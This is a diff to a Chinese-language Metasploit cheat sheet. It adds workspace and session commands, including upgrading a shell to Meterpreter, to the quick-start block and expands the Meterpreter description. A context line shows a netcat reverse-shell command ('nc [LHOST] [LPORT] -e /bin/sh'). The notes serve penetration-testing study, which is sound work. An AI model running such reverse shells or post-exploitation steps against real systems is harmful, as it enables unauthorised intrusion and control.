@@ -18,7 +18,7 @@ msfdb init   # 初始化数据库
 其中启动数据库服务和初始化数据库的步骤容易出现错误, 根据提示信息进行故障排除即可.  
 启动 msfconsole 后可以通过 `db_status` 检查数据库连接状态.  
 
-之后便可以使用数据库相关指令, 关键信息会被记录到数据库中以便后续查询.  
+之后便可以使用数据库相关指令, 关键信息(如主机/服务/漏洞/战利品)会被记录到数据库中以便后续查询.  
 
 ### 导出
 
@@ -32,6 +32,9 @@ db_export -f xml ./msfdb.xml # 将当前 workspace 中的数据以 xml 格式导
 ## 快速入门
 
 ```sh
+msf > workspace [name]    # 切换工作区
+msf > workspace -a [name] # 添加工作区
+
 msf > search [[type:]keyword] # 搜索 module
 msf > use [id/module]         # 使用 module, module 的名称或 search 指令结果中的 id
 msf > use [id/module]         # 显示 module 的详细信息.
@@ -43,6 +46,10 @@ msf(module) > show [option]           # 显示选项的可用选项
 msf(module) > set [option] [id/value] # 设置选项, 选项的值或 show 指令结果中的 id
 msf(module) > check                   # 部分 exploit module 支持, 用于验证 RHOSTS 是否可以被利用
 msf(module) > run                     # 执行 module
+
+msf > sessions         # 列出会话, -l
+msf > sessions [id]    # 打开会话, -i
+msf > sessions -u [id] # 将 shell 升级到 meterpreter
 ```
 
 ## 生成载荷
@@ -70,15 +77,7 @@ nc [LHOST] [LPORT] -e /bin/sh
 
 ## [Meterpreter](https://github.com/rapid7/metasploit-payloads)
 
-Meterpreter 是一种特殊的多功能载荷.  
-
-## 后渗透测试
-
-```sh
-sessions         # 列出会话, -l
-sessions [id]    # 打开会话, -i
-sessions -u [id] # 将 shell 升级到 meterpreter
-```
+Meterpreter 是一种特殊的多功能载荷, 充分利用其功能可以使后渗透攻击变得十分方便.  
 
 ## 故障排除
 
